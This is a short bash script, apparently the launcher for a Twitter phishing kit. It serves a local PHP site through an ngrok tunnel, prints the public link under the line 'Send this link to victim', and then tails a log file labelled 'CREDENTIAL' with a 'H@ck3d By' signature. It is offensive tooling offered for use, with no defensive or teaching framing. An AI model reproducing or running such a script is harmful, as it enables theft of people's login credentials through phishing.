#!/usr/bin/bash

checkngrok()
{
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]];then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    fi
}
clear
#color code and banner

white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 

banner()
{
echo "
 _________  ____      ____  _____  _________  _________  ________  _______     
|  _   _  ||_  _|    |_  _||_   _||  _   _  ||  _   _  ||_   __  ||_   __ \    
|_/ | | \_|  \ \  /\  / /    | |  |_/ | | \_||_/ | | \_|  | |_ \_|  | |__) |   
    | |       \ \/  \/ /     | |      | |        | |      |  _| _   |  __ /    
   _| |_       \  /\  /     _| |_    _| |_      _| |_    _| |__/ | _| |  \ \_  
  |_____|       \/  \/     |_____|  |_____|    |_____|  |________||____| |___| 
                                                                               
"
}
echo ""

runscript()
{
    clear
    echo ""
    banner
    echo -e "${yellow}[*]${white} Starting PHP server..!"
    php -S 127.0.0.1:5555 > /dev/null 2>&1 &
    sleep 2
    echo -e "${yellow}[*]${white} Starting NGROK server..!"
    cd ../.. && ./ngrok http 5555 > /dev/null 2>&1 &
    sleep 10
    clear
    banner
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    echo -e ${green} "-------//Send this link to victim//--------\n"
    echo -e "${green}[*]${yellow} Link :${blue}" 
    echo $link
    echo ""
    echo -e ${green} "\n----// CREDENTIAL //-------"
    echo "" > log.txt
    echo "----------------------------" >> log.txt
    echo "   H@ck3d By Mr_3rr0r_501   " >> log.txt
    echo "----------------------------" >> log.txt
    tail -f log.txt
}
banner
checkngrok
runscript
checkngrok